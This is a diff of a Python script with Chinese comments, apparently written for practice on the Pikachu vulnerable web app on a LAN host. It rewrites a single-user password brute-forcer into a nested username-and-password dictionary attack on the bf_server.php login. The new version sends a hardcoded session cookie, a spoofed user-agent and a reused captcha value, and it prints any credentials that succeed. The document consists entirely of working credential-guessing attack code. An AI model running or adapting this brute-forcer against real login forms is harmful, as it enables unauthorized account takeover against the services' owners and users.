@@ -1,35 +1,26 @@
+import re
 import requests
-
-# 目标页面的URL
-url = 'http://192.168.1.192:8086/pikachu/vul/burteforce/bf_form.php'
-
-# 提交的用户名
-username = input("账号名")
-error_message = 'username or password is not exists～'
-# 密码字典文件路径
-password_file = 'top1000.txt'
-
-# 打开密码字典文件
-with open(password_file, 'r') as f:
-    # 逐行读取密码
-    for password in f:
-        # 去除末尾的换行符
-        password = password.strip()
-
-        # 构建表单数据
-        data = {
-            'username': username,
-            'password': password,
-            'submit': 'Login',
-            'vcode':'320q9a'
-        }#需要手动构造payload
-
-        # 发起POST请求，提交表单数据
-        response = requests.post(url, data=data)
-
-        # 检查响应结果，这里以判断页面内容为例
-        if error_message not in response.text:
-            print('密码破解成功：', password)
-            break
-        else:
-            print('尝试密码：', password)
+with open('user.txt','r') as user:
+    for username in user:
+        #print (username.strip())
+        with open('top1000.txt','r') as passwd:
+            for password in passwd:
+                #print (password.strip())
+                url = "http://192.168.1.192:8086/pikachu/vul/burteforce/bf_server.php"
+                header = {
+                    'Cookie': 'PHPSESSID=5r1bk8gn8nnipo6jnoaipg2tm3; security=impossible',
+                    'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36'
+                }
+                data = {
+                    'username':username.strip(),
+                    'password':password.strip(),
+                    'submit':'Login',
+                    'vcode':'feijs7'#根据实际情况改动
+                }
+                res = requests.post(url=url,headers=header,data=data)
+                #print (res.url)
+                #print (res.text)
+                if  re.findall('login success',res.text):
+                        print ('破解成功')
+                        print ("用户名是：", username.strip())
+                        print ("密码是：", password.strip())
